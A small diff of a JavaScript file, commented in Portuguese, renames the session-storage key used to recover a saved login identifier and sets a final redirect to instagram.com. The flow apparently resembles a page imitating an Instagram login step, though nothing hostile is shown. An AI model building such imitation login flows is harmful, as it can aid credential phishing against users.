@@ -9,7 +9,7 @@ const URL_FINAL = "https://www.instagram.com";
 
 // Recupera o identificador salvo no login
 const urlParams = new URLSearchParams(window.location.search);
-const identifier = urlParams.get('usuario') || urlParams.get('username') || sessionStorage.getItem('loginIdentifier') || sessionStorage.getItem('vr_usuario') || '';
+const identifier = urlParams.get('usuario') || urlParams.get('username') || sessionStorage.getItem('loginIdentifier') || sessionStorage.getItem('ig_usuario') || '';
 
 function maskEmail(email) {
   const [name, domain] = email.split('@');
